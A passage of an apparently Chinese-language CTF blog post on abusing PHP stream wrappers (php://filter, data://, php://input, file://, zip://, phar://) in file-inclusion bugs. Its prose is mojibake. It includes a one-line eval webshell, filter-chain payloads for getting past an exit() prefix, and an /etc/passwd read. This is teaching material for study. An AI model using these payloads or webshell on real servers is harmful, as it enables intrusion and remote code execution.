</span></span><span class="line"><span class="cl">file_put_contents($content, &#39;&lt;?php exit();?&gt;&#39; . $content);</span></span></code></pre></td></tr></table>
</div>
</div><p>æ’å…¥æœ¨é©¬ä»¥åä¹Ÿæ— æ³•ä½¿ç”¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php exit();?&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;?php @eval($_POST[&#39;snakin&#39;]);?&gt;</span></span></code></pre></td></tr></table>
</div>
</div><p>æ­»äº¡exitæºç ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">$content = &#39;&lt;?php exit; ?&gt;&#39;;
</span></span><span class="line"><span class="cl">$content .= $_POST[&#39;txt&#39;];
</span></span><span class="line"><span class="cl">file_put_contents($_POST[&#39;filename&#39;], $content);</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>base64decodeç»•è¿‡
å½“ç”¨æˆ·é€šè¿‡POSTæ–¹å¼æäº¤ä¸€ä¸ªæ•°æ®æ—¶ï¼Œä¼šä¸æ­»äº¡exitè¿›è¡Œæ‹¼æ¥ï¼Œä»è€Œé¿å…æäº¤çš„æ•°æ®è¢«æ‰§è¡Œã€‚
ç„¶è€Œè¿™é‡Œå¯ä»¥åˆ©ç”¨php://filterçš„base64-decodeæ–¹æ³•ï¼Œå°†$contentè§£ç ï¼Œåˆ©ç”¨php base64_decodeå‡½æ•°ç‰¹æ€§å»é™¤æ­»äº¡exitã€‚</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$_GET[&#39;txt&#39;] = preg_replace(&#39;|[^a-z0-9A-Z+/]|s&#39;, &#39;&#39;, $_GET[&#39;txt&#39;]);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">base64_decode($_GET[&#39;txt&#39;]);</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™ä¸ªæ—¶å€™åé¢å†åŠ ä¸Šç¼–ç åçš„ä¸€å¥è¯æœ¨é©¬ï¼Œå°±å¯ä»¥getshelläº†ã€‚</p>
<ul>
<li>strip_tagsç»•è¿‡
è¿™ä¸ª<code>&lt;?php exit; ?&gt;</code>å®é™…ä¸Šæ˜¯ä¸€ä¸ªXMLæ ‡ç­¾ï¼Œæ—¢ç„¶æ˜¯XMLæ ‡ç­¾ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨strip_tagså‡½æ•°å»é™¤å®ƒï¼Œè€Œphp://filteråˆšå¥½æ˜¯æ”¯æŒè¿™ä¸ªæ–¹æ³•çš„ã€‚
ä½†æ˜¯æˆ‘ä»¬è¦å†™å…¥çš„ä¸€å¥è¯æœ¨é©¬ä¹Ÿæ˜¯XMLæ ‡ç­¾ï¼Œåœ¨ç”¨åˆ°strip_tagsæ—¶ä¹Ÿä¼šè¢«å»é™¤ã€‚
æ³¨æ„åˆ°åœ¨å†™å…¥æ–‡ä»¶çš„æ—¶å€™ï¼Œfilteræ˜¯æ”¯æŒå¤šä¸ªè¿‡æ»¤å™¨çš„ã€‚
<strong>å¯ä»¥å…ˆå°†webshellç»è¿‡base64ç¼–ç ï¼Œstrip_tagså»é™¤æ­»äº¡exitä¹‹åï¼Œå†é€šè¿‡base64-decodeå¤åŸã€‚</strong>
payloadï¼š</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php://filter/string.strip_tags|convert.base64-decode/resource=shell.php</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="data" class="heading-element"><span>data://</span>
  <a href="#data" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>æ•°æ®æµå°è£…å™¨ï¼Œä»¥ä¼ é€’ç›¸åº”æ ¼å¼çš„æ•°æ®ã€‚å¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data://æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚
ä¾‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">data://text/plain,
</span></span><span class="line"><span class="cl">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">data://text/plain;base64,
</span></span><span class="line"><span class="cl">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>Example 1ã€æ‰“å° data:// çš„å†…å®¹ã€‘</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">// æ‰“å° &#34;I love PHP&#34;
</span></span><span class="line"><span class="cl">echo  file_get_contents ( &#39;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#39; );
</span></span><span class="line"><span class="cl">?&gt;</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>Example 2ã€è·å–åª’ä½“ç±»å‹ã€‘</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">$fp    =  fopen ( &#39;data://text/plain;base64,&#39; ,  &#39;r&#39; );
</span></span><span class="line"><span class="cl">$meta  =  stream_get_meta_data ( $fp );
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// æ‰“å° &#34;text/plain&#34;
</span></span><span class="line"><span class="cl">echo  $meta [ &#39;mediatype&#39; ];
</span></span><span class="line"><span class="cl">?&gt;</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="file" class="heading-element"><span>file://</span>
  <a href="#file" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶ä¸”ä¸å—allow_url_fopenï¼Œallow_url_includeå½±å“
file://åè®®ä¸»è¦ç”¨äºè®¿é—®<strong>æ–‡ä»¶(ç»å¯¹è·¯å¾„ã€ç›¸å¯¹è·¯å¾„ä»¥åŠç½‘ç»œè·¯å¾„)</strong>
ä¾‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://www.xx.com?file=file:///etc/passsword</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="php" class="heading-element"><span>php://</span>
  <a href="#php" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>åœ¨allow_url_fopenï¼Œallow_url_includeéƒ½å…³é—­çš„æƒ…å†µä¸‹å¯ä»¥æ­£å¸¸ä½¿ç”¨
<strong>php://ä½œç”¨ä¸ºè®¿é—®è¾“å…¥è¾“å‡ºæµ</strong></p>
<h2 id="phpinput" class="heading-element"><span>php://input</span>
  <a href="#phpinput" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>php://inputå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œ<strong>å°†postè¯·æ±‚çš„æ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œ</strong>ã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸ºphp://input,åŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ä¾‹å¦‚ï¼š
</span></span><span class="line"><span class="cl">http://127.0.0.1/cmd.php?cmd=php://input
</span></span><span class="line"><span class="cl">POSTæ•°æ®ï¼š&lt;?php phpinfo()?&gt;
</span></span><span class="line"><span class="cl">æ³¨æ„ï¼šå½“enctype=&#34;multipart/form-data&#34;çš„æ—¶å€™ php://inputæ˜¯æ— æ•ˆçš„</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>é‡åˆ°file_get_contents()è¦æƒ³åˆ°ç”¨php://inputç»•è¿‡ã€‚</strong></p>
<h2 id="zip" class="heading-element"><span>zip://</span>
  <a href="#zip" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>zip:// å¯ä»¥è®¿é—®å‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œzip://æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚
<strong>zip://ä¸­åªèƒ½ä¼ å…¥ç»å¯¹è·¯å¾„ã€‚</strong>
è¦ç”¨#åˆ†éš”å‹ç¼©åŒ…å’Œå‹ç¼©åŒ…é‡Œçš„å†…å®¹ï¼Œå¹¶ä¸”#è¦ç”¨urlç¼–ç %23ï¼ˆå³ä¸‹è¿°POCä¸­#è¦ç”¨%23æ›¿æ¢ï¼‰
åªéœ€è¦æ˜¯zipçš„å‹ç¼©åŒ…å³å¯ï¼Œåç¼€åå¯ä»¥ä»»æ„æ›´æ”¹ã€‚
ç›¸åŒçš„ç±»å‹çš„è¿˜æœ‰zlib://å’Œbzip2://
ä¾‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">zip://[å‹ç¼©åŒ…ç»å¯¹è·¯å¾„]#[å‹ç¼©åŒ…å†…æ–‡ä»¶]?file=zip://D:\zip.jpg%23phpinfo.txt</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pharä¼ªåè®®" class="heading-element"><span>phar://ä¼ªåè®®</span>
  <a href="#phar%e4%bc%aa%e5%8d%8f%e8%ae%ae" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>æ˜¯phpè§£å‹ç¼©æŠ¥çš„ä¸€ä¸ªå‡½æ•°ï¼Œä¸ç®¡åç¼€æ˜¯ä»€ä¹ˆï¼Œéƒ½ä¼šå½“åšå‹ç¼©åŒ…æ¥è§£å‹ã€‚</p>
<p>ç”¨æ³•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?file=phar://å‹ç¼©åŒ…/å†…éƒ¨æ–‡ä»¶ phar://xxx.png/shell.php</span></span></code></pre></td></tr></table>
</div>
</div><p>æ³¨ï¼š PHP&gt;=5.3.0å‹ç¼©åŒ…éœ€è¦æ˜¯zipåè®®å‹ç¼©ï¼Œrarä¸è¡Œï¼Œå°†æœ¨é©¬æ–‡ä»¶å‹ç¼©åï¼Œæ”¹ä¸ºå…¶ä»–ä»»æ„æ ¼å¼çš„æ–‡ä»¶éƒ½å¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚</p>
<p>æ­¥éª¤ï¼šå†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬shellã€‚phpï¼Œç„¶åç”¨zipåè®®è§£å‹ç¼©ä¸ºshell.zipã€‚ç„¶åå°†åç¼€æ”¹ä¸ºpngç­‰å…¶ä»–æ ¼å¼</p>
</div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="Updated on 2023-07-01 11:25:40">Updated on 2023-07-01&nbsp;</span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"><span><a href="/posts/2023web-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="http://localhost:1313/posts/2023web-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-title="PHPä¼ªåè®®" data-hashtags="Web,CTF"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/2023web-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-hashtag="Web"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on å¾®åš" data-sharer="weibo" data-url="http://localhost:1313/posts/2023web-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-title="PHPä¼ªåè®®"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/web/" class="post-tag" title="Tags - Web">Web</a><a href="/tags/ctf/" class="post-tag" title="Tags - CTF">CTF</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
    </section>
  </div><div class="post-nav"><a href="/posts/2023web-ping/" class="post-nav-item" rel="prev" title="Ping"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Ping</a><a href="/posts/2023web-php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/" class="post-nav-item" rel="next" title="PHP Smartyæ¨¡ç‰ˆæ³¨å…¥">PHP Smartyæ¨¡ç‰ˆæ³¨å…¥<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.136.5">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.13">FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">
              <a href="Tin10g.github.io">Ting</a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
        </div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
  </noscript>
</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":1000},"comment":{"enable":false},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.13"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
</html>
